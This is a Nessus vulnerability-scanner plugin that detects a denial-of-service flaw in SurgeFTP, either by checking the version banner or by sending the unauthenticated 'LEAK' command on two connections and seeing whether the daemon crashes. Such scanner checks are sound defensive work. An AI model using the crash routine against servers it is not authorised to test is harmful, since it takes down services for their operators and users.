#
# (C) Tenable Network Security
#
# 


  desc["english"] = "
The remote host is running a version of SurgeFTP that is prone to a
denial of service vulnerability when processing the non-standard LEAK
command.  Reportedly, an attacker can issue two of these commands
without authenticating and cause the ftp daemon process to crash. 

See also : http://www.security.org.sg/vuln/surgeftp22m1.html
Solution : Upgrade to SurgeFTP 2.2m2 or greater.
Risk factor : High";


if (description) {
  script_id(18000);
  script_version("$Revision: 1.2 $");

  script_cve_id("CAN-2005-1034");
  script_bugtraq_id(13054);
 
  name["english"] = "SurgeFTP LEAK Command Denial of Service Vulnerability";
  script_name(english:name["english"]);

  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for LEAK command denial of service vulnerability in SurgeFTP";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Get the banner and make sure it's for SurgeFTP.
banner = get_ftp_banner(port: port);
if (
  !banner ||
  # eg, "220 SurgeFTP netwin1 (Version 2.2k13)"
  !egrep(string:banner, pattern:"^220[ -]SurgeFTP")
) exit(0);


# Check for the vulnerability.
if (safe_checks()) {
  if (egrep(string:banner, pattern:"^220 SurgeFTP .+Version (1\.|2\.([01]|2([a-l]m1[^0-9])))", icase:TRUE)) {
    desc = str_replace(
      string:desc["english"],
      find:"Solution :",
      replace:string(
        "***** Nessus has determined the vulnerability exists on the remote\n",
        "***** host simply by looking at the version number of SurgeFTP\n",
        "***** installed there.\n",
        "\n",
        "Solution :"
      )
    );
    security_hole(port:port, data:desc);
  }
}
else {
  # To actually exploit the vulnerability, we need to issue the 
  # LEAK command from two different connections.
  req = string("LEAK\r\n");
  max = 2;
  for (i=1; i<=max; i++) {
    sockets[i] = open_sock_tcp(port);
    if (sockets[i]) {
      send(socket:sockets[i], data:req);
    }
  }

  # It takes a while for the server to crash so try
  # a couple of times to open another connection.
  tries = 10;
  vuln = 0;
  while (i < (tries + max) && !vuln) {
    sleep(2);
    sockets[i] = open_sock_tcp(port);
    # nb: it's vulnerable if the initial two sockets (used for LEAK)
    #     were opened but this one wasn't.
    vuln = (sockets[1] && sockets[2] && !sockets[i]);
    if (sockets[i]) close(sockets[i]);
    ++i;
  }
  if (vuln) security_hole(port:port, data:desc["english"]);

  # Release any sockets still open.
  for (i=1; i<=max; i++) {
    if (socket[i]) close(socket[i]);
  }
}
